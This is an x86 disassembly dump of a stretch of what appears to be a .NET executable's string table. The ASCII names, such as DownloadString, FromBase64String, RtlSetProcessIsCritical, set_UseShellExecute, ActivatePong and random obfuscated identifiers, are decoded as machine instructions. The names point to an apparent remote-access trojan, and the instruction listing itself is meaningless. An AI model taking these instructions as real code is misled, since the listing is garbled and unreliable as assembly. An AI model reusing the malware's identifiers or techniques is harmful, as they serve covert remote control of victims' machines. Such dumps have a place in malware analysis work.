  408a37:	72 6f                	jb     0x408aa8
  408a39:	64 75 63             	fs jne 0x408a9f
  408a3c:	74 41                	je     0x408a7f
  408a3e:	74 74                	je     0x408ab4
  408a40:	72 69                	jb     0x408aab
  408a42:	62 75 74             	bound  %esi,0x74(%ebp)
  408a45:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a49:	73 65                	jae    0x408ab0
  408a4b:	6d                   	insl   (%dx),%es:(%edi)
  408a4c:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408a50:	6f                   	outsl  %ds:(%esi),(%dx)
  408a51:	70 79                	jo     0x408acc
  408a53:	72 69                	jb     0x408abe
  408a55:	67 68 74 41 74 74    	addr16 push $0x74744174
  408a5b:	72 69                	jb     0x408ac6
  408a5d:	62 75 74             	bound  %esi,0x74(%ebp)
  408a60:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a64:	73 65                	jae    0x408acb
  408a66:	6d                   	insl   (%dx),%es:(%edi)
  408a67:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408a6b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a6c:	6d                   	insl   (%dx),%es:(%edi)
  408a6d:	70 61                	jo     0x408ad0
  408a6f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a70:	79 41                	jns    0x408ab3
  408a72:	74 74                	je     0x408ae8
  408a74:	72 69                	jb     0x408adf
  408a76:	62 75 74             	bound  %esi,0x74(%ebp)
  408a79:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408a7d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a7e:	74 69                	je     0x408ae9
  408a80:	6d                   	insl   (%dx),%es:(%edi)
  408a81:	65 43                	gs inc %ebx
  408a83:	6f                   	outsl  %ds:(%esi),(%dx)
  408a84:	6d                   	insl   (%dx),%es:(%edi)
  408a85:	70 61                	jo     0x408ae8
  408a87:	74 69                	je     0x408af2
  408a89:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408a8c:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408a93:	69 
  408a94:	62 75 74             	bound  %esi,0x74(%ebp)
  408a97:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408a9b:	74 5f                	je     0x408afc
  408a9d:	55                   	push   %ebp
  408a9e:	73 65                	jae    0x408b05
  408aa0:	53                   	push   %ebx
  408aa1:	68 65 6c 6c 45       	push   $0x456c6c65
  408aa6:	78 65                	js     0x408b0d
  408aa8:	63 75 74             	arpl   %esi,0x74(%ebp)
  408aab:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408aaf:	61                   	popa
  408ab0:	64 42                	fs inc %edx
  408ab2:	79 74                	jns    0x408b28
  408ab4:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408ab8:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  408abf:	00 
  408ac0:	44                   	inc    %esp
  408ac1:	65 6c                	gs insb (%dx),%es:(%edi)
  408ac3:	65 74 65             	gs je  0x408b2b
  408ac6:	56                   	push   %esi
  408ac7:	61                   	popa
  408ac8:	6c                   	insb   (%dx),%es:(%edi)
  408ac9:	75 65                	jne    0x408b30
  408acb:	00 47 65             	add    %al,0x65(%edi)
  408ace:	74 56                	je     0x408b26
  408ad0:	61                   	popa
  408ad1:	6c                   	insb   (%dx),%es:(%edi)
  408ad2:	75 65                	jne    0x408b39
  408ad4:	00 53 65             	add    %dl,0x65(%ebx)
  408ad7:	74 56                	je     0x408b2f
  408ad9:	61                   	popa
  408ada:	6c                   	insb   (%dx),%es:(%edi)
  408adb:	75 65                	jne    0x408b42
  408add:	00 61 47             	add    %ah,0x47(%ecx)
  408ae0:	53                   	push   %ebx
  408ae1:	54                   	push   %esp
  408ae2:	66 6b 41 48 76       	imul   $0x76,0x48(%ecx),%ax
  408ae7:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408aeb:	74 5f                	je     0x408b4c
  408aed:	4b                   	dec    %ebx
  408aee:	65 65 70 41          	gs gs jo 0x408b33
  408af2:	6c                   	insb   (%dx),%es:(%edi)
  408af3:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408afa:	5f                   	pop    %edi
  408afb:	4b                   	dec    %ebx
  408afc:	65 65 70 41          	gs gs jo 0x408b41
  408b00:	6c                   	insb   (%dx),%es:(%edi)
  408b01:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408b08:	6f                   	outsl  %ds:(%esi),(%dx)
  408b09:	76 65                	jbe    0x408b70
  408b0b:	00 73 65             	add    %dh,0x65(%ebx)
  408b0e:	74 5f                	je     0x408b6f
  408b10:	42                   	inc    %edx
  408b11:	6c                   	insb   (%dx),%es:(%edi)
  408b12:	6f                   	outsl  %ds:(%esi),(%dx)
  408b13:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408b16:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408b1d:	5f                   	pop    %edi
  408b1e:	54                   	push   %esp
  408b1f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b20:	74 61                	je     0x408b83
  408b22:	6c                   	insb   (%dx),%es:(%edi)
  408b23:	53                   	push   %ebx
  408b24:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408b2b:	5f                   	pop    %edi
  408b2c:	48                   	dec    %eax
  408b2d:	65 61                	gs popa
  408b2f:	64 65 72 53          	fs gs jb 0x408b86
  408b33:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408b3a:	5f                   	pop    %edi
  408b3b:	48                   	dec    %eax
  408b3c:	65 61                	gs popa
  408b3e:	64 65 72 53          	fs gs jb 0x408b95
  408b42:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408b49:	5f                   	pop    %edi
  408b4a:	53                   	push   %ebx
  408b4b:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b4d:	64 42                	fs inc %edx
  408b4f:	75 66                	jne    0x408bb7
  408b51:	66 65 72 53          	data16 gs jb 0x408ba8
  408b55:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408b5c:	5f                   	pop    %edi
  408b5d:	52                   	push   %edx
  408b5e:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408b62:	76 65                	jbe    0x408bc9
  408b64:	42                   	inc    %edx
  408b65:	75 66                	jne    0x408bcd
  408b67:	66 65 72 53          	data16 gs jb 0x408bbe
  408b6b:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408b72:	5f                   	pop    %edi
  408b73:	4b                   	dec    %ebx
  408b74:	65 79 53             	gs jns 0x408bca
  408b77:	69 7a 65 00 45 67 47 	imul   $0x47674500,0x65(%edx),%edi
  408b7e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b7f:	43                   	inc    %ebx
  408b80:	44                   	inc    %esp
  408b81:	4c                   	dec    %esp
  408b82:	46                   	inc    %esi
  408b83:	79 79                	jns    0x408bfe
  408b85:	73 67                	jae    0x408bee
  408b87:	4e                   	dec    %esi
  408b88:	66 00 67 74          	data16 add %ah,0x74(%edi)
  408b8c:	5a                   	pop    %edx
  408b8d:	56                   	push   %esi
  408b8e:	44                   	inc    %esp
  408b8f:	44                   	inc    %esp
  408b90:	71 57                	jno    0x408be9
  408b92:	77 53                	ja     0x408be7
  408b94:	66 00 6f 73          	data16 add %ch,0x73(%edi)
  408b98:	66 6a 67             	pushw  $0x67
  408b9b:	5a                   	pop    %edx
  408b9c:	46                   	inc    %esi
  408b9d:	55                   	push   %ebp
  408b9e:	44                   	inc    %esp
  408b9f:	48                   	dec    %eax
  408ba0:	54                   	push   %esp
  408ba1:	66 00 49 63          	data16 add %cl,0x63(%ecx)
  408ba5:	59                   	pop    %ecx
  408ba6:	6f                   	outsl  %ds:(%esi),(%dx)
  408ba7:	4c                   	dec    %esp
  408ba8:	69 74 4b 58 6f 5a 66 	imul   $0x665a6f,0x58(%ebx,%ecx,2),%esi
  408baf:	00 
  408bb0:	51                   	push   %ecx
  408bb1:	59                   	pop    %ecx
  408bb2:	41                   	inc    %ecx
  408bb3:	62 47 44             	bound  %eax,0x44(%edi)
  408bb6:	71 68                	jno    0x408c20
  408bb8:	63 4f 4f             	arpl   %ecx,0x4f(%edi)
  408bbb:	63 66 00             	arpl   %esp,0x0(%esi)
  408bbe:	53                   	push   %ebx
  408bbf:	43                   	inc    %ebx
  408bc0:	6b 70 6e 6c          	imul   $0x6c,0x6e(%eax),%esi
  408bc4:	79 70                	jns    0x408c36
  408bc6:	43                   	inc    %ebx
  408bc7:	6a 6b                	push   $0x6b
  408bc9:	66 00 6a 79          	data16 add %ch,0x79(%edx)
  408bcd:	46                   	inc    %esi
  408bce:	57                   	push   %edi
  408bcf:	55                   	push   %ebp
  408bd0:	41                   	inc    %ecx
  408bd1:	48                   	dec    %eax
  408bd2:	63 41 67             	arpl   %eax,0x67(%ecx)
  408bd5:	00 78 5a             	add    %bh,0x5a(%eax)
  408bd8:	68 6b 53 64 58       	push   $0x5864536b
  408bdd:	43                   	inc    %ebx
  408bde:	53                   	push   %ebx
  408bdf:	4b                   	dec    %ebx
  408be0:	45                   	inc    %ebp
  408be1:	44                   	inc    %esp
  408be2:	52                   	push   %edx
  408be3:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408be7:	79 70                	jns    0x408c59
  408be9:	74 6f                	je     0x408c5a
  408beb:	43                   	inc    %ebx
  408bec:	6f                   	outsl  %ds:(%esi),(%dx)
  408bed:	6e                   	outsb  %ds:(%esi),(%dx)
  408bee:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  408bf4:	74 5f                	je     0x408c55
  408bf6:	50                   	push   %eax
  408bf7:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408bfe:	5f                   	pop    %edi
  408bff:	50                   	push   %eax
  408c00:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408c07:	74 65                	je     0x408c6e
  408c09:	6d                   	insl   (%dx),%es:(%edi)
  408c0a:	2e 54                	cs push %esp
  408c0c:	68 72 65 61 64       	push   $0x64616572
  408c11:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c18:	5f                   	pop    %edi
  408c19:	50                   	push   %eax
  408c1a:	61                   	popa
  408c1b:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408c22:	64 64 
  408c24:	5f                   	pop    %edi
  408c25:	53                   	push   %ebx
  408c26:	65 73 73             	gs jae 0x408c9c
  408c29:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c30:	6e                   	outsb  %ds:(%esi),(%dx)
  408c31:	67 00 55 54          	add    %dl,0x54(%di)
  408c35:	46                   	inc    %esi
  408c36:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408c39:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408c3c:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408c43:	74 65                	je     0x408caa
  408c45:	6d                   	insl   (%dx),%es:(%edi)
  408c46:	2e 44                	cs inc %esp
  408c48:	72 61                	jb     0x408cab
  408c4a:	77 69                	ja     0x408cb5
  408c4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4d:	67 2e 49             	addr16 cs dec %ecx
  408c50:	6d                   	insl   (%dx),%es:(%edi)
  408c51:	61                   	popa
  408c52:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408c59:	73 
  408c5a:	74 65                	je     0x408cc1
  408c5c:	6d                   	insl   (%dx),%es:(%edi)
  408c5d:	2e 52                	cs push %edx
  408c5f:	75 6e                	jne    0x408ccf
  408c61:	74 69                	je     0x408ccc
  408c63:	6d                   	insl   (%dx),%es:(%edi)
  408c64:	65 2e 56             	gs cs push %esi
  408c67:	65 72 73             	gs jb  0x408cdd
  408c6a:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408c71:	46                   	inc    %esi
  408c72:	72 6f                	jb     0x408ce3
  408c74:	6d                   	insl   (%dx),%es:(%edi)
  408c75:	42                   	inc    %edx
  408c76:	61                   	popa
  408c77:	73 65                	jae    0x408cde
  408c79:	36 34 53             	ss xor $0x53,%al
  408c7c:	74 72                	je     0x408cf0
  408c7e:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408c85:	61                   	popa
  408c86:	73 65                	jae    0x408ced
  408c88:	36 34 53             	ss xor $0x53,%al
  408c8b:	74 72                	je     0x408cff
  408c8d:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408c94:	6e                   	outsb  %ds:(%esi),(%dx)
  408c95:	6c                   	insb   (%dx),%es:(%edi)
  408c96:	6f                   	outsl  %ds:(%esi),(%dx)
  408c97:	61                   	popa
  408c98:	64 53                	fs push %ebx
  408c9a:	74 72                	je     0x408d0e
  408c9c:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408ca3:	74 72                	je     0x408d17
  408ca5:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408cac:	5f                   	pop    %edi
  408cad:	41                   	inc    %ecx
  408cae:	73 53                	jae    0x408d03
  408cb0:	74 72                	je     0x408d24
  408cb2:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408cb9:	5f                   	pop    %edi
  408cba:	41                   	inc    %ecx
  408cbb:	73 53                	jae    0x408d10
  408cbd:	74 72                	je     0x408d31
  408cbf:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408cc6:	53                   	push   %ebx
  408cc7:	74 72                	je     0x408d3b
  408cc9:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408cd0:	73 74                	jae    0x408d46
  408cd2:	72 69                	jb     0x408d3d
  408cd4:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd5:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408cd9:	73 74                	jae    0x408d4f
  408cdb:	65 6d                	gs insl (%dx),%es:(%edi)
  408cdd:	2e 44                	cs inc %esp
  408cdf:	72 61                	jb     0x408d42
  408ce1:	77 69                	ja     0x408d4c
  408ce3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ce4:	67 00 67 65          	add    %ah,0x65(%bx)
  408ce8:	74 5f                	je     0x408d49
  408cea:	41                   	inc    %ecx
  408ceb:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408cef:	61                   	popa
  408cf0:	74 65                	je     0x408d57
  408cf2:	50                   	push   %eax
  408cf3:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf4:	6e                   	outsb  %ds:(%esi),(%dx)
  408cf5:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408cf9:	74 5f                	je     0x408d5a
  408cfb:	41                   	inc    %ecx
  408cfc:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d00:	61                   	popa
  408d01:	74 65                	je     0x408d68
  408d03:	50                   	push   %eax
  408d04:	6f                   	outsl  %ds:(%esi),(%dx)
  408d05:	6e                   	outsb  %ds:(%esi),(%dx)
  408d06:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408d0a:	74 5f                	je     0x408d6b
  408d0c:	45                   	inc    %ebp
  408d0d:	72 72                	jb     0x408d81
  408d0f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d10:	72 44                	jb     0x408d56
  408d12:	69 61 6c 6f 67 00 54 	imul   $0x5400676f,0x6c(%ecx),%esp
  408d19:	79 59                	jns    0x408d74
  408d1b:	6e                   	outsb  %ds:(%esi),(%dx)
  408d1c:	74 54                	je     0x408d72
  408d1e:	73 45                	jae    0x408d65
  408d20:	65 4d                	gs dec %ebp
  408d22:	4c                   	dec    %esp
  408d23:	6d                   	insl   (%dx),%es:(%edi)
  408d24:	6a 46                	push   $0x46
  408d26:	68 00 71 58 72       	push   $0x72587100
  408d2b:	77 59                	ja     0x408d86
  408d2d:	5a                   	pop    %edx
  408d2e:	46                   	inc    %esi
  408d2f:	43                   	inc    %ebx
  408d30:	53                   	push   %ebx
  408d31:	68 00 48 6e 6e       	push   $0x6e6e4800
  408d36:	6d                   	insl   (%dx),%es:(%edi)
  408d37:	4f                   	dec    %edi
  408d38:	56                   	push   %esi
  408d39:	75 6b                	jne    0x408da6
  408d3b:	54                   	push   %esp
  408d3c:	58                   	pop    %eax
  408d3d:	4a                   	dec    %edx
  408d3e:	67 59                	addr16 pop %ecx
  408d40:	68 00 6a 52 6e       	push   $0x6e526a00
  408d45:	64 78 4c             	fs js  0x408d94
  408d48:	55                   	push   %ebp
  408d49:	4b                   	dec    %ebx
  408d4a:	7a 4f                	jp     0x408d9b
  408d4c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d4d:	4d                   	dec    %ebp
  408d4e:	77 4c                	ja     0x408d9c
  408d50:	6a 68                	push   $0x68
  408d52:	00 55 6a             	add    %dl,0x6a(%ebp)
  408d55:	76 78                	jbe    0x408dcf
  408d57:	43                   	inc    %ebx
  408d58:	43                   	inc    %ebx
  408d59:	51                   	push   %ecx
  408d5a:	58                   	pop    %eax
  408d5b:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5c:	71 68                	jno    0x408dc6
  408d5e:	00 43 6f             	add    %al,0x6f(%ebx)
  408d61:	6d                   	insl   (%dx),%es:(%edi)
  408d62:	70 75                	jo     0x408dd9
  408d64:	74 65                	je     0x408dcb
  408d66:	48                   	dec    %eax
  408d67:	61                   	popa
  408d68:	73 68                	jae    0x408dd2
  408d6a:	00 56 65             	add    %dl,0x65(%esi)
  408d6d:	72 69                	jb     0x408dd8
  408d6f:	66 79 48             	data16 jns 0x408dba
  408d72:	61                   	popa
  408d73:	73 68                	jae    0x408ddd
  408d75:	00 46 6c             	add    %al,0x6c(%esi)
  408d78:	75 73                	jne    0x408ded
  408d7a:	68 00 67 65 74       	push   $0x74656700
  408d7f:	5f                   	pop    %edi
  408d80:	45                   	inc    %ebp
  408d81:	78 65                	js     0x408de8
  408d83:	63 75 74             	arpl   %esi,0x74(%ebp)
  408d86:	61                   	popa
  408d87:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408d8b:	61                   	popa
  408d8c:	74 68                	je     0x408df6
  408d8e:	00 47 65             	add    %al,0x65(%edi)
  408d91:	74 54                	je     0x408de7
  408d93:	65 6d                	gs insl (%dx),%es:(%edi)
  408d95:	70 50                	jo     0x408de7
  408d97:	61                   	popa
  408d98:	74 68                	je     0x408e02
  408d9a:	00 67 65             	add    %ah,0x65(%edi)
  408d9d:	74 5f                	je     0x408dfe
  408d9f:	4c                   	dec    %esp
  408da0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408da2:	67 74 68             	addr16 je 0x408e0d
  408da5:	00 47 72             	add    %al,0x72(%edi)
  408da8:	6d                   	insl   (%dx),%es:(%edi)
  408da9:	74 64                	je     0x408e0f
  408dab:	64 72 63             	fs jb  0x408e11
  408dae:	48                   	dec    %eax
  408daf:	71 72                	jno    0x408e23
  408db1:	7a 68                	jp     0x408e1b
  408db3:	00 61 66             	add    %ah,0x66(%ecx)
  408db6:	4d                   	dec    %ebp
  408db7:	72 76                	jb     0x408e2f
  408db9:	5a                   	pop    %edx
  408dba:	57                   	push   %edi
  408dbb:	59                   	pop    %ecx
  408dbc:	44                   	inc    %esp
  408dbd:	4c                   	dec    %esp
  408dbe:	4b                   	dec    %ebx
  408dbf:	46                   	inc    %esi
  408dc0:	69 00 73 6e 48 69    	imul   $0x69486e73,(%eax),%eax
  408dc6:	6e                   	outsb  %ds:(%esi),(%dx)
  408dc7:	79 4c                	jns    0x408e15
  408dc9:	4b                   	dec    %ebx
  408dca:	63 4d 70             	arpl   %ecx,0x70(%ebp)
  408dcd:	61                   	popa
  408dce:	69 00 5a 71 4e 44    	imul   $0x444e715a,(%eax),%eax
  408dd4:	49                   	dec    %ecx
  408dd5:	74 64                	je     0x408e3b
  408dd7:	62 50 6c             	bound  %edx,0x6c(%eax)
  408dda:	64 69 00 51 6c 77 5a 	imul   $0x5a776c51,%fs:(%eax),%eax
  408de1:	61                   	popa
  408de2:	48                   	dec    %eax
  408de3:	41                   	inc    %ecx
  408de4:	70 66                	jo     0x408e4c
  408de6:	69 00 69 49 77 61    	imul   $0x61774969,(%eax),%eax
  408dec:	64 51                	fs push %ecx
  408dee:	57                   	push   %edi
  408def:	4a                   	dec    %edx
  408df0:	59                   	pop    %ecx
  408df1:	6b 69 00 44          	imul   $0x44,0x0(%ecx),%ebp
  408df5:	57                   	push   %edi
  408df6:	55                   	push   %ebp
  408df7:	62 48 48             	bound  %ecx,0x48(%eax)
  408dfa:	78 73                	js     0x408e6f
  408dfc:	49                   	dec    %ecx
  408dfd:	63 6f 70             	arpl   %ebp,0x70(%edi)
  408e00:	69 00 55 72 69 00    	imul   $0x697255,(%eax),%eax
  408e06:	58                   	pop    %eax
  408e07:	68 4e 69 57 6a       	push   $0x6a57694e
  408e0c:	4a                   	dec    %edx
  408e0d:	74 48                	je     0x408e57
  408e0f:	44                   	inc    %esp
  408e10:	6f                   	outsl  %ds:(%esi),(%dx)
  408e11:	46                   	inc    %esi
  408e12:	76 69                	jbe    0x408e7d
  408e14:	00 7a 74             	add    %bh,0x74(%edx)
  408e17:	42                   	inc    %edx
  408e18:	76 6c                	jbe    0x408e86
  408e1a:	4e                   	dec    %esi
  408e1b:	78 43                	js     0x408e60
  408e1d:	58                   	pop    %eax
  408e1e:	6f                   	outsl  %ds:(%esi),(%dx)
  408e1f:	7a 41                	jp     0x408e62
  408e21:	6a 00                	push   $0x0
  408e23:	76 7a                	jbe    0x408e9f
  408e25:	59                   	pop    %ecx
  408e26:	67 67 56             	addr16 addr16 push %esi
  408e29:	62 4d 58             	bound  %ecx,0x58(%ebp)
  408e2c:	70 44                	jo     0x408e72
  408e2e:	6a 00                	push   $0x0
  408e30:	42                   	inc    %edx
  408e31:	64 46                	fs inc %esi
  408e33:	58                   	pop    %eax
  408e34:	53                   	push   %ebx
  408e35:	6f                   	outsl  %ds:(%esi),(%dx)
  408e36:	4a                   	dec    %edx
  408e37:	64 62 6c 6f 45       	bound  %ebp,%fs:0x45(%edi,%ebp,2)
  408e3c:	6a 00                	push   $0x0
  408e3e:	49                   	dec    %ecx
  408e3f:	41                   	inc    %ecx
  408e40:	56                   	push   %esi
  408e41:	58                   	pop    %eax
  408e42:	6f                   	outsl  %ds:(%esi),(%dx)
  408e43:	50                   	push   %eax
  408e44:	65 56                	gs push %esi
  408e46:	61                   	popa
  408e47:	4c                   	dec    %esp
  408e48:	4e                   	dec    %esi
  408e49:	68 59 6a 00 6a       	push   $0x6a006a59
  408e4e:	48                   	dec    %eax
  408e4f:	6a 75                	push   $0x75
  408e51:	54                   	push   %esp
  408e52:	65 4a                	gs dec %edx
  408e54:	4f                   	dec    %edi
  408e55:	70 75                	jo     0x408ecc
  408e57:	47                   	inc    %edi
  408e58:	61                   	popa
  408e59:	6a 6a                	push   $0x6a
  408e5b:	00 4b 4a             	add    %cl,0x4a(%ebx)
  408e5e:	50                   	push   %eax
  408e5f:	70 50                	jo     0x408eb1
  408e61:	79 45                	jns    0x408ea8
  408e63:	54                   	push   %esp
  408e64:	64 47                	fs inc %edi
  408e66:	6b 6e 6a 00          	imul   $0x0,0x6a(%esi),%ebp
  408e6a:	75 6e                	jne    0x408eda
  408e6c:	4a                   	dec    %edx
  408e6d:	64 59                	fs pop %ecx
  408e6f:	46                   	inc    %esi
  408e70:	79 69                	jns    0x408edb
  408e72:	42                   	inc    %edx
  408e73:	6f                   	outsl  %ds:(%esi),(%dx)
  408e74:	6e                   	outsb  %ds:(%esi),(%dx)
  408e75:	69 42 6b 00 4d 69 4f 	imul   $0x4f694d00,0x6b(%edx),%eax
  408e7c:	77 4d                	ja     0x408ecb
  408e7e:	59                   	pop    %ecx
  408e7f:	4b                   	dec    %ebx
  408e80:	4f                   	dec    %edi
  408e81:	68 43 6b 00 4f       	push   $0x4f006b43
  408e86:	4a                   	dec    %edx
  408e87:	71 67                	jno    0x408ef0
  408e89:	49                   	dec    %ecx
  408e8a:	58                   	pop    %eax
  408e8b:	6b 4f 71 7a          	imul   $0x7a,0x71(%edi),%ecx
  408e8f:	6b 4e 4e 4e          	imul   $0x4e,0x4e(%esi),%ecx
  408e93:	4e                   	dec    %esi
  408e94:	48                   	dec    %eax
  408e95:	6b 00 41             	imul   $0x41,(%eax),%eax
  408e98:	73 79                	jae    0x408f13
  408e9a:	6e                   	outsb  %ds:(%esi),(%dx)
  408e9b:	63 43 61             	arpl   %eax,0x61(%ebx)
  408e9e:	6c                   	insb   (%dx),%es:(%edi)
  408e9f:	6c                   	insb   (%dx),%es:(%edi)
  408ea0:	62 61 63             	bound  %esp,0x63(%ecx)
  408ea3:	6b 00 52             	imul   $0x52,(%eax),%eax
  408ea6:	65 6d                	gs insl (%dx),%es:(%edi)
  408ea8:	6f                   	outsl  %ds:(%esi),(%dx)
  408ea9:	74 65                	je     0x408f10
  408eab:	43                   	inc    %ebx
  408eac:	65 72 74             	gs jb  0x408f23
  408eaf:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408eb6:	56                   	push   %esi
  408eb7:	61                   	popa
  408eb8:	6c                   	insb   (%dx),%es:(%edi)
  408eb9:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408ec0:	43 
  408ec1:	61                   	popa
  408ec2:	6c                   	insb   (%dx),%es:(%edi)
  408ec3:	6c                   	insb   (%dx),%es:(%edi)
  408ec4:	62 61 63             	bound  %esp,0x63(%ecx)
  408ec7:	6b 00 54             	imul   $0x54,(%eax),%eax
  408eca:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408ed1:	6c                   	insb   (%dx),%es:(%edi)
  408ed2:	62 61 63             	bound  %esp,0x63(%ecx)
  408ed5:	6b 00 52             	imul   $0x52,(%eax),%eax
  408ed8:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408edf:	4b 65 
  408ee1:	79 50                	jns    0x408f33
  408ee3:	65 72 6d             	gs jb  0x408f53
  408ee6:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408eed:	68 65 63 6b 00       	push   $0x6b6365
  408ef2:	46                   	inc    %esi
  408ef3:	6c                   	insb   (%dx),%es:(%edi)
  408ef4:	75 73                	jne    0x408f69
  408ef6:	68 46 69 6e 61       	push   $0x616e6946
  408efb:	6c                   	insb   (%dx),%es:(%edi)
  408efc:	42                   	inc    %edx
  408efd:	6c                   	insb   (%dx),%es:(%edi)
  408efe:	6f                   	outsl  %ds:(%esi),(%dx)
  408eff:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408f02:	5a                   	pop    %edx
  408f03:	4d                   	dec    %ebp
  408f04:	76 61                	jbe    0x408f67
  408f06:	49                   	dec    %ecx
  408f07:	46                   	inc    %esi
  408f08:	79 64                	jns    0x408f6e
  408f0a:	78 4e                	js     0x408f5a
  408f0c:	6d                   	insl   (%dx),%es:(%edi)
  408f0d:	6b 00 76             	imul   $0x76,(%eax),%eax
  408f10:	4e                   	dec    %esi
  408f11:	50                   	push   %eax
  408f12:	45                   	inc    %ebp
  408f13:	6e                   	outsb  %ds:(%esi),(%dx)
  408f14:	70 71                	jo     0x408f87
  408f16:	56                   	push   %esi
  408f17:	4e                   	dec    %esi
  408f18:	70 6b                	jo     0x408f85
  408f1a:	00 58 78             	add    %bl,0x78(%eax)
  408f1d:	63 78 58             	arpl   %edi,0x58(%eax)
  408f20:	50                   	push   %eax
  408f21:	53                   	push   %ebx
  408f22:	72 66                	jb     0x408f8a
  408f24:	51                   	push   %ecx
  408f25:	4d                   	dec    %ebp
  408f26:	68 79 7a 66 78       	push   $0x78667a79
  408f2b:	6b 00 41             	imul   $0x41,(%eax),%eax
  408f2e:	67 5a                	addr16 pop %edx
  408f30:	44                   	inc    %esp
  408f31:	4e                   	dec    %esi
  408f32:	52                   	push   %edx
  408f33:	45                   	inc    %ebp
  408f34:	47                   	inc    %edi
  408f35:	6a 41                	push   $0x41
  408f37:	6c                   	insb   (%dx),%es:(%edi)
  408f38:	00 4b 4e             	add    %cl,0x4e(%ebx)
  408f3b:	41                   	inc    %ecx
  408f3c:	49                   	dec    %ecx
  408f3d:	53                   	push   %ebx
  408f3e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f3f:	63 54 70 4f          	arpl   %edx,0x4f(%eax,%esi,2)
  408f43:	66 48                	dec    %ax
  408f45:	4e                   	dec    %esi
  408f46:	6c                   	insb   (%dx),%es:(%edi)
  408f47:	00 52 74             	add    %dl,0x74(%edx)
  408f4a:	6c                   	insb   (%dx),%es:(%edi)
  408f4b:	53                   	push   %ebx
  408f4c:	65 74 50             	gs je  0x408f9f
  408f4f:	72 6f                	jb     0x408fc0
  408f51:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f54:	73 49                	jae    0x408f9f
  408f56:	73 43                	jae    0x408f9b
  408f58:	72 69                	jb     0x408fc3
  408f5a:	74 69                	je     0x408fc5
  408f5c:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408f5f:	00 4e 65             	add    %cl,0x65(%esi)
  408f62:	74 77                	je     0x408fdb
  408f64:	6f                   	outsl  %ds:(%esi),(%dx)
  408f65:	72 6b                	jb     0x408fd2
  408f67:	43                   	inc    %ebx
